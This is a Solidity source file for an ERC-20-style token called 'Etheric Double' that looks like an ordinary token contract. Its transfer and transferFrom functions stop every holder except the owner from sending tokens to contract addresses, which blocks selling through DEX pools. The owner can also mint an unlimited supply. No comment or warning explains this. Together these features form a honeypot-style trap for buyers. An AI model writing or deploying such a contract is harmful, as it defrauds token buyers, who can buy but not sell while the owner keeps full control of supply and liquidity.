// SPDX-License-Identifier: MIX
pragma solidity ^0.8.28;

contract Etheric_Double {
    string public name = "Etheric Double";
    string public symbol = "E2";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        totalSupply = 1000000 * 10 ** uint256(decimals);
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        if (msg.sender != owner) {
            require(!isContract(_to), "Only the owner can send tokens to contracts");
        }

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");

        if (_from != owner) {
            require(!isContract(_to), "Only the owner can send tokens to contracts");
        }

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function mint(uint256 _amount) public onlyOwner {
        totalSupply += _amount;
        balanceOf[owner] += _amount;
        emit Transfer(address(0), owner, _amount);
    }

    function burn(uint256 _amount) public onlyOwner {
        require(balanceOf[owner] >= _amount, "Insufficient balance to burn");
        totalSupply -= _amount;
        balanceOf[owner] -= _amount;
        emit Transfer(owner, address(0), _amount);
    }
}